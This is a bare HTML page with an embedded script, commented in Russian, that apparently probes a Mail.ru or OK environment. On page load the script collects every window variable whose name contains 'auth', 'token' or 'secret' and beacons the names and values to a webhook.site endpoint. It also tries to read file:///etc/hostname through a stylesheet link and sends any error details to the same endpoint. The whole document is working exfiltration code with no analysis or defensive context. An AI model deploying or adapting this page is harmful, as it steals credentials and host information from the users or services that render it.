<!DOCTYPE html>
<html>
<body>
    <script>
        const hook = "https://webhook.site/a792cec2-4ac4-47f4-b6c7-67ac60e6b049";

        

        (function() {
    const findings = [];
    // Проверяем наличие специфических объектов Mail.ru / OK
    if (window.OK) findings.push("OK_OBJ_FOUND");
    if (window.MailRu) findings.push("MAILRU_OBJ_FOUND");
    
    // Попытка получить доступ к переменным окружения через типичные утечки
    for (let key in window) {
        if (key.toLowerCase().includes("auth") || key.toLowerCase().includes("token") || key.toLowerCase().includes("secret")) {
            findings.push(`${key}=${window[key]}`);
        }
    }
    navigator.sendBeacon(hook + "/INTERNAL_VARS", JSON.stringify(findings));
})();

        try {
    // Вызываем ошибку через несуществующий элемент
    const link = document.createElement('link');
    link.rel = 'stylesheet';
    link.href = 'file:///etc/hostname'; // Попытка прочитать имя машины
    link.onerror = (e) => {
        // В некоторых версиях Chrome объект ошибки содержит путь
        navigator.sendBeacon(hook + "/TRACE?err=" + btoa(JSON.stringify(e, ["message", "arguments", "type"])));
    };
    document.head.appendChild(link);
} catch(e) {}

    </script>
